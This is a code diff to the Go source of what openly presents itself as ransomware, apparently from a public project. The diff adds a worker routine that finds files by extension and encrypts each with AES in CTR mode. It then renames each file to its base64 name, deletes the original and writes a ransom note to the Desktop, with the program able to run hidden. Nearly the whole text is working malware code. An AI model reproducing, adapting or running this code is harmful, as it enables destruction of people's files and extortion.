@@ -1,8 +1,13 @@
 package main
 
 import (
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
 	"encoding/base64"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/url"
@@ -12,7 +17,6 @@ import (
 	"sync"
 	"time"
 
-	"github.com/mauri870/cryptofile/crypto"
 	"github.com/mauri870/ransomware/client"
 	"github.com/mauri870/ransomware/cmd"
 	"github.com/mauri870/ransomware/rsa"
@@ -35,12 +39,13 @@ func main() {
 	// Execution locked for windows
 	cmd.CheckOS()
 
+	// Hannibal ad portas
 	encryptFiles()
 
 	// If you compile this program without -ldflags "-H windowsgui"
 	// you can see a console window with all actions performed by
-	// the malware. Otherwise, the lines above will be ignored and
-	// it will run in background
+	// the malware. Otherwise, the lines above and all logs will be
+	// discarted and it will run in background
 	//
 	// If in console mode, wait for enter to close the window
 	var s string
@@ -120,16 +125,14 @@ func encryptFiles() {
 				if ext != "" {
 					// Matching extensions
 					if utils.StringInSlice(strings.ToLower(ext[1:]), cmd.InterestingExtensions) {
-						file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
-
-						// Each file is processed by a free worker on the pool, so, for each file
-						// we need wait for the goroutine to finish
-						wg.Add(1)
-
+						// Each file is processed by a free worker on the pool
 						// Send the file to the MatchedFiles channel then workers
 						// can imediatelly proccess then
-						cmd.MatchedFiles <- file
 						log.Println("Matched:", path)
+						cmd.MatchedFiles <- cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
+
+						//for each file we need wait for the goroutine to finish
+						wg.Add(1)
 					}
 				}
 				return nil
@@ -141,7 +144,7 @@ func encryptFiles() {
 	}()
 
 	// Process files that are sended to the channel
-	// Launch NumWorker workers for handle the files concurrently
+	// Launch NumWorkers workers for handle the files concurrently
 	for i := 0; i < cmd.NumWorkers; i++ {
 		go func() {
 			for {
@@ -155,32 +158,7 @@ func encryptFiles() {
 
 					log.Printf("Encrypting %s...\n", file.Path)
 
-					// Read the file content
-					text, err := ioutil.ReadFile(file.Path)
-					if err != nil {
-						log.Println(err)
-						return
-					}
-
-					// Encrypting using AES-256-CFB
-					ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
-					if err != nil {
-						log.Println(err)
-						return
-					}
-
-					newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
-					err = ioutil.WriteFile(newpath+cmd.EncryptionExtension, ciphertext, 0600)
-					if err != nil {
-						log.Println(err)
-						return
-					}
-
-					// Remove the original file
-					err = os.Remove(file.Path)
-					if err != nil {
-						log.Println("Cannot delete original file, skipping...")
-					}
+					encryptFile(file, keys["enckey"])
 				}
 			}
 		}()
@@ -210,4 +188,53 @@ func encryptFiles() {
 	ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
 
 	log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
+}
+
+// Encrypt a single file
+func encryptFile(file cmd.File, enckey string) {
+	// Read the file content
+	content, err := ioutil.ReadFile(file.Path)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	// Create a 128 bits cipher.Block for AES-256
+	block, err := aes.NewCipher([]byte(enckey))
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	// The IV needs to be unique, but not secure
+	ciphertext := make([]byte, aes.BlockSize+len(content))
+	iv := ciphertext[:aes.BlockSize]
+	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
+		log.Println(err)
+		return
+	}
+	stream := cipher.NewCTR(block, iv)
+	stream.XORKeyStream(ciphertext[aes.BlockSize:], content)
+
+	// Replace the file name by the base64 equivalent
+	newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
+
+	// Create/Open the output file
+	outFile, err := os.OpenFile(newpath+cmd.EncryptionExtension, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	defer outFile.Close()
+
+	// Copy the encrypted content to a new file
+	if _, err = io.Copy(outFile, bytes.NewReader(ciphertext)); err != nil {
+		log.Println(err)
+		return
+	}
+
+	err = os.Remove(file.Path)
+	if err != nil {
+		log.Println("Cannot delete original file, skipping...")
+	}
 }
